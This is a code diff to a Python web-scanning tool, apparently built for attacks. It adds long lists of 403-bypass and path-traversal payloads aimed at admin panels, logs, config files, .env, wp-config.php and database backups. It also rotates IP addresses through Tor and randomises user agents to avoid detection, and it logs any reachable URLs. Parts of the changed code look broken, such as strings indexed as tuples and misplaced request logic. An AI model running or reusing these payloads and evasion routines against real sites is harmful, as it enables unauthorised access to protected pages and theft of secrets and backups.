@@ -24,7 +24,54 @@ fuzz = ["/admin/?","//admin//","///admin///","/./admin/./","/admin?","/admin??",
         "/admin/%26/","/admin/#","/admin/#/","/admin/#/./","/./admin","/./admin/","/..;/admin","/..;/admin/","/.;/admin","/.;/admin/","/;/admin",
         "/;/admin/","//;//admin","//;//admin/","/admin/./","/%2e/admin","/%2e/admin/","/%20/admin/%20","/%20/admin/%20/","/admin/..;/","/admin.json",
         "/admin/.json","/admin..;/","/admin;/","/admin%00","/admin.css","/admin.html","/admin?id=1","/admin~","/admin/~","/admin/°/","/admin/&",
-        "/admin/-","/admin\\/\\/","/admin/..%3B/","/admin/;%2f..%2f..%2f","/ADMIN","/ADMIN/","/admin/..\\;/","/*/admin","/*/admin/","/ADM+IN","/ADM+IN/"]
+        "/admin/-","/admin\\/\\/","/admin/..%3B/","/admin/;%2f..%2f..%2f","/ADMIN","/ADMIN/","/admin/..\\;/","/*/admin","/*/admin/","/ADM+IN","/ADM+IN/"] # convert to tuples
+
+bypass_payloads = {
+    "admin": [
+        "//admin//", "///admin///", "/admin//login", "/admin///index",
+        "/./admin/", "/admin/./login", "/admin/../admin/", "/././admin", "/admin/../../admin", "/admin/..;/", "/admin//../",
+        "/%2e/admin/", "/admin%2f", "/admin%2e%2e/", "/%2e%2e/admin", "/admin%00", "/admin%09", "/admin\\/\\/", "/admin/%2e%2e/", "/%2e/admin%2e%2e",
+        "/admin%20", "/admin%09", "/admin%0a", "/admin%0d", "/admin%25", "/admin%3f", "/admin%26", "/admin;%2f..%2f..%2f", "/..%3b/admin", "/admin;%00", "/admin/%00/",
+        "/ADMIN", "/AdMiN", "/Adm%49n", "/admIN/", "/ADM+IN", "/admin~", "/admin/~", "/admin/°/", "/Admin./",
+        "/admin.css", "/admin.html", "/admin.json", "/admin/.json", "/admin.php", "/admin.bak", "/admin.old", "/admin.inc", "/admin.asp", "/admin.aspx",
+        "/admin?id=1", "/admin.php?debug=true", "/admin?access=granted", "/admin#", "/admin?redirect=/login", "/admin?.css", "/admin?user=admin&pass=admin",
+        "/..;/admin", "/admin..;/", "/%2e%2e%2fadmin", "/%2e%2e/admin", "/%2e%2e/%2e%2e/admin", "/%252e%252e/%252e%252e/admin"
+    ],
+
+    "log": [
+        "//logs//", "///logs///", "/log//", "/log///debug",
+        "/./logs/", "/logs/./error", "/logs/../", "/././log", "/logs/../../", "/logs/..;/", "/logs//../",
+        "/%2e/logs/", "/logs%2f", "/logs%2e%2e/", "/%2e%2e/logs", "/logs%00", "/logs%09", "/logs\\/\\/", "/logs/%2e%2e/", "/%2e/logs%2e%2e",
+        "/logs%20", "/logs%09", "/logs%0a", "/logs%0d", "/logs%25", "/logs%3f", "/logs%26", "/logs;%2f..%2f..%2f", "/..%3b/logs", "/logs;%00", "/logs/%00/",
+        "/LOGS", "/LoGs", "/Lo%47s", "/LOG+S", "/log~", "/logs/~", "/logs/°/", "/Logs./",
+        "/error.log", "/access.log", "/debug.log", "/logs.php", "/logs.json", "/logs.txt", "/logs.tar.gz", "/logfile.bak",
+        "/logs?type=debug", "/logs?download=1", "/logs?id=1", "/logs.php?dump=1", "/logs?.log", "/logs?user=admin&debug=true",
+        "/..;/logs", "/logs..;/", "/%2e%2e%2flogs", "/%2e%2e/logs", "/%2e%2e/%2e%2e/logs", "/%252e%252e/%252e%252e/logs"
+    ],
+
+    "config": [
+        "//config//", "///config///", "/config//settings", "/config///hidden",
+        "/./config/", "/config/./", "/config/../", "/././config", "/config/../../", "/config/..;/", "/config//../",
+        "/%2e/config/", "/config%2f", "/config%2e%2e/", "/%2e%2e/config", "/config%00", "/config%09", "/config\\/\\/", "/config/%2e%2e/", "/%2e/config%2e%2e",
+        "/config%20", "/config%09", "/config%0a", "/config%0d", "/config%25", "/config%3f", "/config%26", "/config;%2f..%2f..%2f", "/..%3b/config", "/config;%00", "/config/%00/",
+        "/CONFIG", "/ConfIg", "/CONF+IG", "/con%66ig", "/config~", "/config/~", "/config/°/", "/Config./",
+        "/config.php", "/config.json", "/config.yaml", "/config.ini", "/config.xml", "/.env", "/wp-config.php", "/conf/settings.conf", "/config.bak",
+        "/config?id=1", "/config?download=1", "/config?.json", "/config.php?debug=true",
+        "/..;/config", "/config..;/", "/%2e%2e%2fconfig", "/%2e%2e/config", "/%2e%2e/%2e%2e/config", "/%252e%252e/%252e%252e/config"
+    ],
+
+    "backup": [
+        "//backup//", "///backup///", "/backup//2023", "/backup///db",
+        "/./backup/", "/backup/./", "/backup/../", "/././backup", "/backup/../../", "/backup/..;/", "/backup//../",
+        "/%2e/backup/", "/backup%2f", "/backup%2e%2e/", "/%2e%2e/backup", "/backup%00", "/backup%09", "/backup\\/\\/", "/backup/%2e%2e/", "/%2e/backup%2e%2e",
+        "/backup%20", "/backup%09", "/backup%0a", "/backup%0d", "/backup%25", "/backup%3f", "/backup%26", "/backup;%2f..%2f..%2f", "/..%3b/backup", "/backup;%00", "/backup/%00/",
+        "/BACKUP", "/BackUp", "/BA+KUP", "/ba%63kup", "/backup~", "/backup/~", "/backup/°/", "/Backup./",
+        "/backup.zip", "/backup.tar.gz", "/db_backup.sql", "/site_backup.sql", "/database_backup.bak", "/backup.json", "/backup.ini", "/backup.old", "/backup.bak", "/.backup",
+        "/backup?id=1", "/backup?dl=1", "/backup.php?view=true", "/backup?.zip", "/backup?file=latest.sql",
+        "/..;/backup", "/backup..;/", "/%2e%2e%2fbackup", "/%2e%2e/backup", "/%2e%2e/%2e%2e/backup", "/%252e%252e/%252e%252e/backup"
+    ]
+}
+
 headers = [{"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"},
     {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"},
     {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"},
@@ -83,7 +130,6 @@ range1 = 50
 range2 = 70
 
 
-
 def change_ip():
     with Controller.from_port(port=9051) as controller:
         controller.authenticate()
@@ -133,16 +179,21 @@ def Vulnsearch():
         for i in range(len(dorks)):
             if stop_event.is_set():
                 return
-            if dorks[i] not in tried and dorks[i][1] != " ":
+            if dorks[i] not in tried and dorks[i][1] == " " and dorks[i][2] == " ":
                 with lock:
-                    tried.add(dorks[i])
+                    tried.append(dorks[i])
                     
-                URL = "https://" + dorks[i][0] + target + dorks[i][1]
-            else:
+                URL = "https://" + dorks[i][0] + target 
+            elif dorks[i] not in tried and dorks[i][1] != " " and dorks[i][2] == " " :
                 with lock:
-                    tried.add(dorks[i])
+                    tried.append(dorks[i])
 
-                URL = "https://" + dorks[i][0] + target
+                URL = "https://" + dorks[i][0] + target + dorks[i][1]
+            elif dorks[i] not in tried and dorks[i][1] != " " and dorks[i][2] != " " :
+                with lock:
+                    tried.append(dorks[i])
+                URL = "https://" + dorks[i][0] + target + dorks[i][1] + dorks[i][2]
+
                 try:            
                     s = requests.get(URL, headers=headers[rh])
                     reqcount += 1
@@ -152,23 +203,16 @@ def Vulnsearch():
                         flagcatch(s,flagscaught)
                     elif s.status_code == 403:
                         try:
-                            for k in range(len(fuzz)):
-                                if dorks[i][1] == " ":
-                                    nopostfix = "https://" + dorks[i][0] + target + fuzz[k]
-                                    np = requests.get(nopostfix, headers=headers[rh])
-                                    reqcount += 1
-                                    if np.status_code in [202,200,302]:
+                            for payload_list in bypass_payloads.values():
+                                for payload in payload_list:
+                                    req = "https://" + target + payload
+                                    r = requests.get(req, headers=headers[rh])
+                                    reqcount += 1 
+
+                                    if r.status_code in [202,200,302]:
                                         with lock:
-                                            vulnerable.append("https://" + dorks[i][0] + target + fuzz[k])
-                                        flagcatch(np,flagscaught)
-                                else:
-                                    bypassatt = "https://" + dorks[i][0] + target + dorks[i][1] + fuzz[k]
-                                    ss = requests.get(bypassatt, headers=headers[rh])
-                                    reqcount += 1
-                                    if ss.status_code in [202,200,302]:
-                                        with lock:
-                                            vulnerable.append("https://" + dorks[i][0] + target + dorks[i][1] + fuzz[k])
-                                        flagcatch(ss,flagscaught)
+                                            vulnerable.append(req)
+                                        flagcatch(r,flagscaught)
                         except requests.exceptions.RequestException as e:
                             print(f"403 fuzz Request Connection error: {e}")
                             stop_event.set()
@@ -227,6 +271,14 @@ def bypass():
     def task2(target,flagscaught):
         global stop_event
         reqcount = 0
+        change_ip()
+        lastslash = 0
+        for i in range(len(target)):
+            if target[i] == "/":
+                lastslash = i
+        if lastslash == 5 or lastslash == 6:
+            lastslash = 7
+        core = target[lastslash + 1:len(target)]
         rh = random.randint(0, len(headers)-1)
         rm = random.randint(range1, range2)
         for i in range(len(fuzz)):
@@ -235,13 +287,13 @@ def bypass():
             if fuzz[i] not in fuzztried:
                 with lock:
                     fuzztried.append(fuzz[i])
-                    fuzzatt = "https://" + target + fuzz[i]
+                    fuzzatt = "https://" + fuzz[i][0] + core + fuzz[i][1]
                 try:
                     ff = requests.get(fuzzatt, headers=headers[rh])
                     reqcount +=1 
                     if ff.status_code in [202,200,302]:
                         with lock:
-                            vulnerable.append("https://" + target + fuzz[i])
+                            vulnerable.append(fuzzatt)
                         flagcatch(ff,flagscaught)
                 except (KeyboardInterrupt, requests.exceptions.RequestException) as e:
                     print(f"403 fuzz attempt failed: {e}")
@@ -374,7 +426,7 @@ def threadcont():
         n = k
     elif i == 2:
         n = multiprocessing.cpu_count
-    mainmenu()
+    return mainmenu()
 
 def ratelimitcont():
     global range1 , range2
@@ -391,7 +443,7 @@ def ratelimitcont():
     elif i == 2:
         range1 = 50
         range2 = 70
-    mainmenu()
+    return mainmenu()
 
 
 print("Loading please wait")
